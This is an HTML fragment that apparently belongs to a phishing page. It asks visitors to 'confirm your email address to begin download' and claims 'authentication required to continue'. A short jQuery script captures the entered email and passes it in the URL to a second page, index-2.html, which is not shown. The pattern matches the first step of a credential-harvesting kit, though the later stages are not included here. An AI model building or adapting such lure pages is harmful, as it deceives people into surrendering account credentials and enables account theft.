        <div class="topic">Confirm your email address<br>to begin download.</div>
        <form method="post" name="form1">
			<input name="email" id="email" type="email" class="textField1" value="" placeholder="Enter your email address" required/>
			<div class="Info2">
				<p><br /><a href="#" class="TextLink1">Learn more</a></p>
				<p><a href="#" class="TextLink2">Authentication required to continue</a>
				<input name="button" type="submit" class="button2" id="sub" value="Next" />
				<div class="clearfix1"></div>
			</div>
        </form>
		<script>
$(document).ready(function() {
	$("#sub").click(function(event){
		event.preventDefault();
		var us = $("#email").val();
		 window.location.href="index-2.html#"+us;
		
		});
});

</script>
    </div>
